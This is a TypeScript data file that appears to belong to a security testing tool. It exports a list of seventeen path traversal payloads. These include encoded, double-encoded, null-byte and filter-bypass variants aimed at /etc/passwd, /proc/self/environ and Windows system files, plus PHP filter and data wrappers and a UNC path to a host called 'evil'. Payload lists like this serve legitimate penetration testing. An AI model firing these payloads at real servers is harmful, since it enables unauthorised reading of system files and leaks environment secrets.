import type { PayloadItem } from '../types'

export const PATH_PAYLOADS: PayloadItem[] = [
  { id: 'path-1', category: 'pathTraversal', featured: true, label: '../etc/passwd', value: '../../../../etc/passwd' },
  { id: 'path-2', category: 'pathTraversal', featured: true, label: '..\\windows', value: '..\\..\\..\\windows\\win.ini' },
  { id: 'path-3', category: 'pathTraversal', featured: true, label: 'Encoded ../', value: '..%2F..%2F..%2Fetc%2Fpasswd' },
  { id: 'path-4', category: 'pathTraversal', featured: true, label: 'Double encoded', value: '..%252F..%252Fetc%252Fpasswd' },
  { id: 'path-5', category: 'pathTraversal', featured: true, label: 'Absolute unix', value: '/etc/passwd' },
  { id: 'path-6', category: 'pathTraversal', featured: true, label: 'File URI', value: 'file:///etc/passwd' },
  { id: 'path-7', category: 'pathTraversal', featured: true, label: 'Null truncate', value: '../../../../etc/passwd%00.png' },
  { id: 'path-8', category: 'pathTraversal', featured: true, label: 'UNC path', value: '\\\\evil\\share\\file' },
  { id: 'path-9', category: 'pathTraversal', label: 'Dotdot unicode', value: '..%c0%af..%c0%afetc/passwd' },
  { id: 'path-10', category: 'pathTraversal', label: 'Proc self', value: '/proc/self/environ' },
  { id: 'path-11', category: 'pathTraversal', label: 'Windows system', value: 'C:\\Windows\\System32\\drivers\\etc\\hosts' },
  { id: 'path-12', category: 'pathTraversal', label: 'Nested dots', value: '....//....//etc/passwd' },
  { id: 'path-13', category: 'pathTraversal', label: 'URL path', value: '/../../admin' },
  { id: 'path-14', category: 'pathTraversal', label: 'Filter bypass', value: '..././..././etc/passwd' },
  { id: 'path-15', category: 'pathTraversal', label: 'PHP wrapper', value: 'php://filter/convert.base64-encode/resource=index.php' },
  { id: 'path-16', category: 'pathTraversal', featured: true, label: 'Windows short', value: '..\\..\\boot.ini' },
  { id: 'path-17', category: 'pathTraversal', featured: true, label: 'Data wrapper', value: 'data://text/plain;base64,SGVsbG8=' },
]
